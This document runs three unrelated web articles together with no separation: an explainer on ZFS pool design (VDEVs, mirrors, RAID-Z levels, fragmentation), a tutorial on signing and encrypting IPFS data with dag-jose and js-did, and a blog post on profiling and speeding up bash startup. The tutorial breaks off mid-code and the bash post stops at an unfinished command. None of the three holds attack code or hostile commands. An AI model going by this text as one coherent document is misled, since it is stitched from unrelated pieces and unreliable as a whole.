            <!-- content --><p>ZFS has become increasingly popular in recent years. ZFS on Linux (ZoL) has pushed the envelope and exposed many newcomers to the ZFS fold. iXsystems has adopted the newer codebase, now called <strong>OpenZFS, </strong>into its codebase for TrueNAS CORE. The purpose of this article is to help those of you who have heard about ZFS but have not yet had the opportunity to research it.</p>
<p>Our hope is that we leave you with a better understanding of how and why it works the way it does. Knowledge is key to the decision-making process, and we feel that ZFS is something worth considering for most organizations.<br>
<span id="more-44288"></span></p>
<h2>What is ZFS?</h2>
<p>ZFS is a <strong>filesystem</strong>, but unlike most other file systems it is also the <strong>logical volume manager</strong> or LVM. What that means is ZFS directly controls not only how the bits and blocks of your files are stored on your hard drives, but it also controls how your hard drives are logically arranged for the purposes of RAID and redundancy. ZFS is also classified as a <strong>copy-on-write</strong> or <a href="https://www.ixsystems.com/documentation/freenas/11.2/zfsprimer.html">COW filesystem</a>. This means that ZFS can do some cool things like <strong>snapshots</strong> that a normal filesystem like NTFS could not. A snapshot can be thought of like it sounds, a photograph of how something was at a point in time. How a COW filesystem works, however, has some important implications that we need to discuss.</p>
<figure id="attachment_44997" aria-describedby="caption-attachment-44997"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-322x300.png" alt="The Open ZFS Logo" width="322" height="300" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-322x300.png 322w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-800x746.png 800w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-696x649.png 696w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_-450x420.png 450w, https://www.servethehome.com/wp-content/uploads/2020/07/Openzfs.svg_.png 1024w" sizes="(max-width: 322px) 100vw, 322px"><figcaption id="caption-attachment-44997">The Open ZFS Logo</figcaption></figure>
<p>Hard Drives work such that the pieces of your data are stored in <strong>Logical Block Addresses</strong>, or LBAs. ZFS is aware of what LBAs a specific file is stored in. Let us say we need to write a file that is big enough to fit into 3 blocks. We are going to store that file in LBA 1000, 1001, and 1002. This is considered a sequential write, as all of these blocks are stored directly next to each other. For spinning hard drives, this is ideal, as the write head does not have to move off of the track it is on.</p>
<figure id="attachment_23424" aria-describedby="caption-attachment-23424"><a href="https://www.servethehome.com/western-digital-red-pro-10tb-nas-hdd-review/wd-red-10tb-pro-nas-top/" rel="attachment wp-att-23424"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top.jpg" alt="WD Red 10TB Pro NAS Top" width="800" height="786" srcset="https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top.jpg 800w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-305x300.jpg 305w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-696x684.jpg 696w, https://www.servethehome.com/wp-content/uploads/2017/07/WD-Red-10TB-Pro-NAS-Top-427x420.jpg 427w" sizes="(max-width: 800px) 100vw, 800px"></a><figcaption id="caption-attachment-23424">WD Red 10TB Pro NAS Top <a href="https://www.servethehome.com/wd-red-smr-vs-cmr-tested-avoid-red-smr/">Use CMR with ZFS, not SMR</a></figcaption></figure>
<p>Now, let us say we make a change to the file and the part that was stored at LBA 1001 needs to be modified. When we write that change, ZFS does not over-write the part of the file that was stored in 1001. Instead, it will write that block to LBA 2001. LBA 1001 will be kept as-is until the snapshot keeping it there expires. This allows us to have both the current version of the file, and the previous one, while <em>only storing the difference.</em> However, the next time we go to read the file back, the read head of our spinning hard drive needs to read LBA 1000, go to the track where LBA 2001 is stored, read that, and then go back to the track where LBA 1002 is stored. This phenomenon is called <strong>fragmentation.</strong></p>
<h2>A Primer on ZFS Pool Design</h2>
<p>To make ZFS pools easier to understand, we are going to focus on using small storage containers as you may have around the house or shop. Before we continue, it is worth defining some terms. A <strong>VDEV, </strong>or virtual device, is a logical grouping of one or more storage devices. A <strong>pool</strong> is then a logically defined group built from 1 or more VDEVs. ZFS is very customizable, and therefore, there are many different types of configurations for VDEVs. You can think of the construction of a ZFS pool by visualizing the following graphic:</p>
<figure id="attachment_45011" aria-describedby="caption-attachment-45011"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-800x521.jpg" alt="Nested Storage Containers" width="696" height="453" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-800x521.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-400x261.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-1536x1001.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-2048x1334.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-696x453.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-1068x696.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-645x420.jpg 645w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45011">Nested Storage Containers</figcaption></figure>
<p>Starting from the smallest container size, we have our drives. We can see that in this visualization we have two drives in each larger container. These two larger containers are our VDEVs. The single largest container, then, is our pool. In this configuration, we would have each pair of drives in a <strong>mirror. </strong>This means that one drive can fail in either (or both!) VDEV and the pool would continue to function in a <strong>degraded</strong> state.</p>
<figure id="attachment_45012" aria-describedby="caption-attachment-45012"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-800x538.jpg" alt="Two Mirrors, Each VDEV with One Bad Drive" width="696" height="468" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-800x538.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-400x269.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-1536x1034.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-2048x1378.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-696x468.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-1068x719.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-624x420.jpg 624w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45012">Two Mirrors, Each VDEV with One Bad Drive</figcaption></figure>
<p>However, if 2 drives in a <strong>single</strong> VDEV, all of the data in our entire pool is lost. There is no redundancy of the pool itself, all redundancy in ZFS is in the VDEV layer. If one <em>VDEV</em> fails, there is not enough information to rebuild the missing data.</p>
<figure id="attachment_45013" aria-describedby="caption-attachment-45013"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-800x559.jpg" alt="Two Mirrors, One VDEV where Both Drives Failed" width="696" height="486" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-800x559.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-400x280.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-1536x1074.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-696x487.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-1068x747.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-601x420.jpg 601w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed-100x70.jpg 100w, https://www.servethehome.com/wp-content/uploads/2020/07/A-Mirrored-VDEV-With-Two-Bad-Drives-failed.jpg 1991w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45013">Two Mirrors, One VDEV where Both Drives Failed</figcaption></figure>
<p>Next, we need to define what&nbsp;<strong>RAID-Z</strong> is and what the various levels of RAID-Z are. RAID-Z is a way of putting multiple drives together into a VDEV and storing <strong>parity,&nbsp;</strong>or fault tolerance. In ZFS, there is no dedicated “parity drive” like in&nbsp;<strong>Unraid</strong>, but it instead stores parity across all of the drives in the VDEV.&nbsp; The amount of parity that is spread across the drives determines the level of RAID-Z. It is in this way more similar to traditional hardware RAID.</p>
<p>What can make RAID-Z a better approach than a mirrored configuration is that it does not matter <em>what&nbsp;</em>drive fails in a RAID-Z. Each drive is an equal partner, whereas, in a mirrored configuration, each mirrored VDEV is a separate entity. This benefit of RAID-Z comes at the cost of performance, however, and a mirrored pool will almost always be <em>faster</em>&nbsp;than RAID Z.</p>
<p><strong>RAID-Z</strong>&nbsp;is similar to a traditional&nbsp;<strong>RAID 5. </strong>In RAID-Z you have one drive worth of parity. In other words, if you lose one drive, your pool will continue to function. For RAID-Z you need a minimum of 3 drives per VDEV. You can have 3, 7, or even 12 drives in a RAID-Z VDEV. The more drives which you add, however, the longer it will take to <strong>resilver,&nbsp;</strong>or rebuild.</p>
<p>This increased time increases the risk of your data, as a second drive failure during this process would destroy your pool. ZFS will resilver while the data is still in use, it is a live recovery. The implication of this is that our disks are working harder than usual during this process, and this can increase the chances of a second drive failure. Your data is still accessible and in production, while it is reading all of the parity data from the existing members of your VDEV and then writing it to the new disk.</p>

<p>A RAID-Z2 VDEV is more akin to a RAID 6. In this configuration, 2 drives worth of parity is stored across all of your devices. You can lose up to two drives per VDEV and your pool will still function. Adding more parity drives increases calculations required which means you need more processing performance to operate the array.</p>
<figure id="attachment_45015" aria-describedby="caption-attachment-45015"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-800x551.jpg" alt="A Pool with a Single 4-Disk Raid Z2 VDEV" width="696" height="479" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-800x551.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-400x276.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-1536x1059.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-2048x1412.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-218x150.jpg 218w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-696x480.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-1068x736.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-609x420.jpg 609w, https://www.servethehome.com/wp-content/uploads/2020/07/A-RAID-Z2-100x70.jpg 100w" sizes="(max-width: 696px) 100vw, 696px"><figcaption id="caption-attachment-45015">A Pool with a Single 4-Disk Raid Z2 VDEV</figcaption></figure>
<p>Finally, a RAID-Z3 VDEV provides three drives worth of parity, so you can lose up to three drives per VDEV and your pool will still function. <strong>The more drives of parity you add, however, the slower your performance ends up being</strong>. You need a minimum of four but should use at least five drives to build a RAID-Z3 VDEV.</p>
<h2>The Need for Speed</h2>
<p>There are two ways in which we measure speed or <em>fastness</em>,&nbsp;<strong>IOPS,</strong>&nbsp;and&nbsp;<strong>Throughput</strong>. In RAIDZ, more drives will give you more throughput, or the actual read and write speed you see when transferring files. However, if you have ever tried to run multiple file copies in Windows simultaneously, you may have noticed the more you do, the slower it gets. It does not always get slower at a constant rate, the more you try to do disks will get exponentially slower. This is because your disk can only do so many Input/Output Operations per Second, or IOPS.</p>
<p>RAIDZ will scale in&nbsp;<em>throughput</em>&nbsp;with the more disks you add, but it does not scale with&nbsp;<em>IOPS.</em> What that generally means is, RAIDZ is not traditionally the best choice for I/O intensive workloads, as the amount of IOPS is roughly limited to the slowest member of our VDEV if we exclude all of the caching ZFS has. Virtualization, as we are discussing here, is highly dependent on I/O.</p>
<p>Earlier, we discussed that ZFS is a COW filesystem, and because of that it suffers from data fragmentation. There are direct performance implications that stem from that fact.&nbsp;<strong>The more “full” your pool is, the slower it will ultimately get.&nbsp;</strong>Write speeds in ZFS are directly tied to the amount of&nbsp;<em>adjacent</em> free blocks there are to write to. As your pool fills up, and as data fragments, there are fewer and fewer blocks that are directly adjacent to one another. A single large file may span blocks scattered all over the surface of your hard drive. Even though you would expect that file to be a sequential write, it no longer can be if your drive is full.</p>
<figure id="attachment_45006" aria-describedby="caption-attachment-45006"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark.png" alt="Seagate Mobile HDD Crystal Disk Mark Performance" width="482" height="351" srcset="https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark.png 482w, https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark-400x291.png 400w, https://www.servethehome.com/wp-content/uploads/2020/07/Seagate-Mobile-HDD-Crystale-DIsk-Mark-324x235.png 324w" sizes="(max-width: 482px) 100vw, 482px"><figcaption id="caption-attachment-45006">Seagate Mobile HDD Crystal Disk Mark Performance</figcaption></figure>
<p>In the above graphic, we can see a Seagate 1TB mobile drive that I tested in CrystalDiskMark. It can do about 130 MB/s of sequential read and writes. We can also see that when we start doing random 4k I/O, the speed falls about <strong>100x</strong>. This is meant to illustrate the performance impact of data fragmentation. Additionally, we can see that the latency for these lookups can take about&nbsp;<strong>half of a second, </strong>and we are limited to about 350 IOPS. In order to be fast, virtualization workloads on traditional hard drives need to have many disks in order to compensate for this slowness. It would not be uncommon to see a pool constructed of 10 or more VDEVs of mirrored drives.</p>
<p>Additionally, there is some wisdom we can <a href="https://www.ixsystems.com/community/threads/the-path-to-success-for-block-storage.81165">borrow from the ZFS community</a>. As your pool fills up, and sequential writes become increasingly difficult to accomplish due to fragmentation, it will slow down in a non-linear way. As a general rule of thumb, at about 50% capacity your pool will be noticeably slower than it was when it was 10% capacity. At about 80%-96% capacity, your pool starts to become very slow, and ZFS will actually change its write algorithm to ensure data integrity, further slowing you down.</p>
<p>This is where SSDs come in. They radically change the game because they work very differently at the physical layer. They do not have read and write heads that are flying around a spinning disk back and forth trying to find your data. With the physical limitations of disk-based drives out of the way, SSDs can read and write non-sequential data <em>much&nbsp;</em>faster. They do not suffer the penalties of these rules nearly as severely, fragmentation does not hurt their performance to the same degree.</p>

                    <p>Storing authenticated and encrypted data on <a href="https://ipfs.io/">IPFS</a> is a core building block for many Web3 applications, but to date there has not been a standardized way to encode this type of data.</p><p>Without a standard, many developers have been forced to create custom formats for their signed and encrypted data. This has been prohibitive to the openness and interoperability of information stored in IPFS by siloing data to their particular implementation. Another approach to authenticated data has been to put data in IPFS and put the CID of the data in a smart contract on a blockchain, such as <a href="https://ethereum.org/">Ethereum</a>. This is essentially an expensive way of adding a signature on top of the data and persisting the signature record on the blockchain.</p><p>With the introduction of <strong><a href="https://eips.ethereum.org/EIPS/eip-2844">EIP-2844</a>,</strong> a standard that allows wallets to support a few new methods for signing and decrypting data based on <a href="https://www.w3.org/TR/did-core/">DIDs</a> and the <strong><a href="https://github.com/ipld/specs/pull/269"><code>dag-jose</code></a></strong> IPLD codec, we can now simply put authenticated and encrypted data directly into IPFS. In this tutorial, you will learn how you can utilize these primitives with two libraries, <a href="https://github.com/ceramicnetwork/js-did"><code>js-did</code></a> and <a href="https://github.com/3box/3id-connect"><code>3ID Connect</code></a>!</p><h2 id="what-are-dids-and-jose">What are DIDs and JOSE?</h2><p><strong>DIDs</strong> is the W3C standard for <em>Decentralized Identifiers</em>. It specifies a general way of going from a string identifier, e.g. <code>did:3:bafy...</code>, to a <em>DID document</em> which contains public keys for signature verification and key exchange. In most DID methods the document can be updated when keys are rotated for security reasons.</p><p><strong>JOSE</strong> is a standard from <a href="https://www.ietf.org/standards/">IETF</a> which stands for <em>JSON Object Signing and Encryption,</em> and that pretty much explains what it is. There are two main primitives in this standard: JWS (JSON Web Signatures) and JWE (JSON Web Encryption). Both of these formats allow for multiple participants: in JWS there can be one or multiple signatures over the payload, and in JWE there might be one or multiple recipients for the encrypted cleartext.</p><h2 id="building-with-dag-jose-and-eip2844">Building with dag-jose and EIP2844</h2><p>As we have been building out <a href="https://ceramic.network/">Ceramic</a> with <strong>dag-jose</strong> and <strong>EIP-2844</strong> as basic building blocks, we've created a few lower-level tools which allow us to more easily use these technologies. This tutorial will show you how to use these powerful tools directly.</p><p><strong><a href="https://github.com/3box/identity-wallet-js/">IdentityWallet</a></strong> is an implementation of <strong>EIP-2844</strong> using 3ID as the DID method. It can be used standalone as a <em>DID Provider,</em> or more conveniently within the <strong><a href="https://github.com/3box/3id-connect/">3ID Connect</a></strong> library. 3ID Connect allows users to use their Ethereum wallet (support for more blockchains coming soon) to get access to a <em>DID Provider</em>.</p><p><strong><a href="https://github.com/ceramicnetwork/js-did">js-did</a></strong> is a library that allows developers to represent a user in the form of a DID. This is the main interface we're going to be looking at in this tutorial. It allows us to sign data with the currently authenticated user, encrypt data to any user (DID), and decrypt data with the currently authenticated user.</p><h2 id="signed-data-in-ipfs">Signed data in IPFS</h2><p>By using the <strong>dag-jose</strong> IPLD codec we can create data structures that are linked and signed. This is done by creating JSON Web Signatures (JWS) that contain a link to additional data. One of the main problems that the <strong>dag-jose</strong> codec solves is that the payload of a JWS is traditionally encoded as <code>base64url</code> which means that if it contains any IPLD links you can't traverse those links. Instead what we do with <em>DagJWS</em> is enforce the payload to be the bytes of a CID. The codec then transforms the payload into a CID instance and sets it to the <code>link</code> property of the <em>DagJWS. </em>This allows us to easily traverse the resulting DAG.</p><h2 id="setup-your-environment">Setup your environment</h2><p>This section will cover how to set up some specific dependencies needed for this tutorial. If you just want to skip the setup part we have prepared <a href="https://ceramicstudio.github.io/web-playground/">a simple playground</a> which bundles ipfs, 3id-connect, and dids. You can use it by opening the web page, clicking on connect, then opening the developer console where you can run the commands. If you decide to do so, skip the following two sections.</p><h3 id="setup-ipfs-with-dag-jose-support">Setup IPFS with dag-jose support</h3><p>Since dag-jose is a new IPLD codec it's not yet included in js-ipfs by default. It also implements the new IPLD codec API which is also not supported by js-ipfs yet. Therefore we need to do the following when we are creating an instance of IPFS:</p><pre><code>import IPFS from 'ipfs'
import dagJose from 'dag-jose'
import multiformats from 'multiformats/basics'
import legacy from 'multiformats/legacy'

multiformats.multicodec.add(dagJose)
const dagJoseFormat = legacy(multiformats, dagJose.name)

const ipfs = await Ipfs.create({ ipld: { formats: [dagJoseFormat] } })
</code></pre><h3 id="setup-did-and-3id-connect">Setup DID and 3ID Connect</h3><p>In the example setup below we use an injected Ethereum provider (such as MetaMask) to create a 3ID Connect and DID instance.</p><pre><code>import { DID } from 'dids'
import { ThreeIdConnect, EthereumAuthProvider } from '3id-connect'

// create 3id connect instance
const addresses = await window.ethereum.enable()
const authProvider = new EthereumAuthProvider(window.ethereum, addresses[0])
await threeIdConnect.connect(authProvider)

// create did instance
const didProvider = await threeIdConnect.getDidProvider()
const did = new DID({ provider: didProvider })
await did.authenticate()
window.did = did
console.log('Connected with DID:', did.id)</code></pre><h2 id="create-a-signed-data-structure">Create a signed data structure</h2><p>We can now start signing and adding data to IPFS! First lets create a simple function that takes a payload, signs it using the <code>did.createDagJWS</code> method, and adds the resulting data to IPFS. As we can see in the code below we get two objects back from this method: <code>jws</code> which is the DagJWS itself and <code>linkedBlock</code> which is the raw bytes of the encoded payload. What happens in the background is that the payload gets encoded using <strong>dag-cbor</strong>, after this the CID of the encoded payload is used as the payload of the created <code>jws</code>. We can access this payload CID on the DagJWS instance as <code>jws.link</code>.</p><pre><code>async function addSignedObject(payload) {
  // sign the payload as dag-jose
  const { jws, linkedBlock } = await did.createDagJWS(payload)
  // put the JWS into the ipfs dag
  const jwsCid = await ipfs.dag.put(jws, { format: 'dag-jose', hashAlg: 'sha2-256' })
  // put the payload into the ipfs dag
  await ipfs.block.put(linkedBlock, { cid: jws.link })
  return jwsCid
}</code></pre><p>Using this function, let's create our first signed data objects:</p><pre><code>// Create our first signed object
const cid1 = await addSignedObject({ hello: 'world' })

// Log the DagJWS:
console.log((await ipfs.dag.get(cid1)).value)
// &gt; {
// &gt;   payload: "AXESIHhRlyKdyLsRUpRdpY4jSPfiee7e0GzCynNtDoeYWLUB",
// &gt;   signatures: [{
// &gt;     signature: "h7bHmTaBGza_QlFRI9LBfgB3Nw0m7hLzwMm4nLvcR3n9sHKRoCrY0soWnDbmuG7jfVgx4rYkjJohDuMNgbTpEQ",
// &gt;     protected: "eyJraWQiOiJkaWQ6MzpiYWdjcWNlcmFza3hxeng0N2l2b2tqcW9md295dXliMjN0aWFlcGRyYXpxNXJsem4yaHg3a215YWN6d29hP3ZlcnNpb24taWQ9MCNrV01YTU1xazVXc290UW0iLCJhbGciOiJFUzI1NksifQ"
// &gt;   }],
// &gt;   link: CID(bafyreidykglsfhoixmivffc5uwhcgshx4j465xwqntbmu43nb2dzqwfvae)
// &gt; }

// Log the payload:
ipfs.dag.get(cid1, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }

// Create another signed object that links to the previous one
const cid2 = addSignedObject({ hello: 'getting the hang of this', prev: cid1 })

// Log the new payload:
ipfs.dag.get(cid2, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; {
// &gt;   hello: 'getting the hang of this'
// &gt;   prev: CID(bagcqcerappi42sb4uyrjkhhakqvkiaibkl4pfnwpyt53xkmsbkns4y33ljzq)
// &gt; }

// Log the old payload:
ipfs.dag.get(cid2, { path: '/link/prev/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }
</code></pre><p>Note that the values of the CIDs and JWS will be different for you since the payload will be signed by your DID.</p><h2 id="verify-a-signed-data-structure">Verify a signed data structure</h2><p>Verifying a JWS is very straight forward. Simply retrieve the JWS object and pass it to the <code>verifyJWS</code> method. If the signature is invalid, this function will throw an error. If the signature is valid, it will will return the DID (with key fragment) that was used to sign the JWS.</p><pre><code>const jws1 = await ipfs.dag.get(cid1)
const jws2 = await ipfs.dag.get(cid2)

const signingDID1 = await did.verifyJWS(jws1)
await did.verifyJWS(jws2)
</code></pre><h2 id="encrypted-data-in-ipfs">Encrypted data in IPFS</h2><p>Signed data in IPFS is one piece of the puzzle, but perhaps more interesting is encrypted data. With the use of <em>dag-jose</em> and <em>EIP-2844</em> we can encrypt data to one or multiple DIDs and store it directly in IPFS. Below we demonstrate how to use the convenient tools provided by the <em>js-did</em> library to do this.</p><h2 id="encrypt-ipld-data">Encrypt IPLD data</h2><p>There is a simple method to create a DagJWE object which is encrypted to one or multiple DIDs, <code>createDagJWE</code>. This method accepts an IPLD object (a JSON object that may also include CID links) and an array of DIDs. It will resolve the DIDs to retrieve the public encryption keys found in their DID document and create a JWE that is encrypted to these keys. To get going, let's create a helper function that creates a JWE and puts it into IPFS.</p><pre><code>async function addEncryptedObject(cleartext, dids) {
    const jwe = await did.createDagJWE(cleartext, dids)
    return ipfs.dag.put(jwe, { format: 'dag-jose', hashAlg: 'sha2-256' })
}
</code></pre><p>Once we have this function we can create a few encrypted objects. In the example below we first create a simple encrypted object, then we create an additional encrypted object that links to the previous one.</p><pre><code>const cid3 = await addEncryptedObject({ hello: 'secret' }, [did.id])

const cid4 = await addEncryptedObject({ hello: 'cool!', prev: cid3 }, [did.id])</code></pre><p>Note that in the example above we use <code>[did.id](&lt;http://did.id&gt;)</code> to encrypt the data to the currently authenticated DID. We can of course also encrypt the data to the DID of a user that is not locally authenticated, such as another user!</p><h2 id="decrypt-ipld-data">Decrypt IPLD data</h2><p>When the data is retrieved from IPFS we will just get the encrypted JWE. This means that we need to decrypt the data after we fetch it. Since we have created objects that link to each other, lets create a function that retrieves these objects and decrypts them recursively.</p><pre><code>async function followSecretPath(cid) {
    const jwe = (await ipfs.dag.get(cid)).value
    const cleartext = await did.decryptDagJWE(jwe)
    console.log(cleartext)
    …</code></pre></div></section></div>

				<p>I sped up bash startup from 165&nbsp;ms to 40&nbsp;ms. It’s actually noticeable.
Why and how did I do it?</p>

<h3 id="motivation">Motivation</h3>

<p>Whenever I need to quickly look something up (or use a calculator), I open a
new terminal (using a keyboard shortcut) and start typing into it. Slow bash
startup disrupts this workflow as I would often type before the shell prompt:</p>

<p><img src="https://work.lisk.in/img/even-faster-bash-startup/mistype.png" alt="messed up prompt"></p>

<p><a href="https://twitter.com/danpker">Daniel Parker</a> recently wrote an excellent blog post <a href="https://danpker.com/posts/2020/faster-bash-startup/">Faster Bash
Startup</a> detailing his journey from 1.7 seconds to 210&nbsp;ms. I start at 165&nbsp;ms
and need to go significantly lower than Daniel, therefore different techniques
will be needed.</p>

<h3 id="investigation">Investigation</h3>

<p><a href="https://github.com/sharkdp/hyperfine">hyperfine</a> is a brilliant command-line tool for benchmarking commands that
I discovered recently (thanks to Daniel!), so let’s see where we are now:</p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean ± σ):     165.8 ms ±   0.7 ms    [User: 156.3 ms, System: 12.8 ms]
  Range (min … max):   164.9 ms … 167.1 ms    17 runs
</code></pre></div></div>

<p>Now we need to find out what’s taking so long. <a href="https://stackoverflow.com/questions/5014823/how-to-profile-a-bash-shell-script-slow-startup/20855353">How to profile a bash shell
script slow startup?</a> Most Stack Overflow answers suggest some
variant of <code>set -x</code>, which will help us find any single command that takes
unusually long.</p>

<h4 id="man">man</h4>

<p>In my case, that command was <code>man -w</code>, specifically <a href="https://github.com/liskin/dotfiles/blob/7d14190467fe22bf5d4f85a7b202118d2341e3ed/.bashrc.d/10_env.sh#L8-L10">this piece of my
<code>.bashrc.d/​10_env.sh</code></a>:</p>

<div><div><pre><code><span>export </span><span>MANPATH</span><span>=</span><span>$HOME</span>/.local/share/man:
<span># FIXME: workaround for /usr/share/bash-completion/completions/man</span>
<span>MANPATH</span><span>=</span><span>$(</span>man <span>-w</span><span>)</span>
</code></pre></div></div>

<p>Turns out none of this is needed any more, <code>man</code> and <code>manpath</code> now add
<code>~/.local/​share/​man</code> automatically so I can just drop it and save more than
100&nbsp;ms<sup id="fnref:man-seccomp" role="doc-noteref"><a href="#fn:man-seccomp">1</a></sup>.</p>

<h4 id="death-by-a-thousand-cuts">death by a thousand cuts</h4>

<p>But that’s it. No other single command stands out, it’s just a lot of small
things that add up. Daniel says “it has to take <em>some</em> time,” and he’s mostly
right, but I still have one trick up my sleeve.</p>

<p>My <code>.bashrc</code> is split into several smaller parts in <code>~/.bashrc.d</code>, so I can
profile these and see if anything stands out. My
<a href="https://github.com/liskin/dotfiles/blob/68964611b4b578b646cf5f13a47a4ee77e93e740/.bashrc"><code>.bashrc</code></a>
thus becomes:</p>

<div><div><pre><code><span>for </span>i <span>in</span> ~/.bashrc.d/<span>*</span>.sh<span>;</span> <span>do
	if</span> <span>[[</span> <span>$__bashrc_bench</span> <span>]]</span><span>;</span> <span>then
		</span><span>TIMEFORMAT</span><span>=</span><span>"</span><span>$i</span><span>: %R"</span>
		<span>time</span> <span>.</span> <span>"</span><span>$i</span><span>"</span>
		<span>unset </span>TIMEFORMAT
	<span>else</span>
		<span>.</span> <span>"</span><span>$i</span><span>"</span>
	<span>fi
done</span><span>;</span> <span>unset </span>i
</code></pre></div></div>

<p>Let’s see what happens…</p>

<div><div><pre><code>[tomi@notes ~]$ __bashrc_bench=1 bash -i

</code></pre></div></div>

<p>118&nbsp;ms in <code>10_env.sh</code> was caused by <code>man -w</code> and we know what to do with that.</p>

<h4 id="completions">completions</h4>

<p>11&nbsp;ms in <code>31_​completion.sh</code> which loads <a href="https://github.com/scop/bash-completion">bash-completion</a>. That’s
certainly better than Daniel’s 235&nbsp;ms, probably because up-to-date
bash-completion only loads a few necessary completions and defers everything
else to being loaded on demand. I couldn’t live without the completions, so
11&nbsp;ms is a fair price.</p>

<p>8&nbsp;ms for <code>50_​git_​dotfiles.sh</code>, which defines a few aliases and
sets up git completions for my <code>git-dotfiles</code> alias, seems too much, though.
Good news is that we don’t need to drop this. We can use bash-completion’s
on-demand loading. Whenever completions for command <code>cmd</code> are needed for the
first time, bash-completion looks for
<code>~/.local/​share/​bash-completion/​completions/​cmd</code> or
<code>/usr/​share/​bash-completion/​completions/​cmd</code>.</p>

<p>Therefore,
<a href="https://github.com/liskin/dotfiles/blob/68964611b4b578b646cf5f13a47a4ee77e93e740/.local/share/bash-completion/completions/git-dotfiles"><code>~/.local/​share/​bash-completion/​completions/​git-dotfiles</code></a>
becomes:</p>

<div><div><pre><code>. /usr/share/bash-completion/completions/git
complete -F _git git-dotfiles
</code></pre></div></div>

<h4 id="fzf">fzf</h4>

<p><code>90_fzf.sh</code> loads key bindings and completions code so that <a href="https://github.com/junegunn/fzf">fzf</a> is used
when searching through history, completing <code>**</code> in filenames, etc. Well worth
the 11&nbsp;ms it needs to load<sup id="fnref:fzf" role="doc-noteref"><a href="#fn:fzf">2</a></sup>.</p>

<h4 id="are-we-done-yet">are we done yet?</h4>

<p>After these changes, I got:</p>

<div><div><pre><code>[tomi@notes ~]$ __bashrc_bench=1 bash -i

</code></pre></div></div>

<p>That’s 29&nbsp;ms, brilliant! Or… is it? <emoji>🤔</emoji></p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
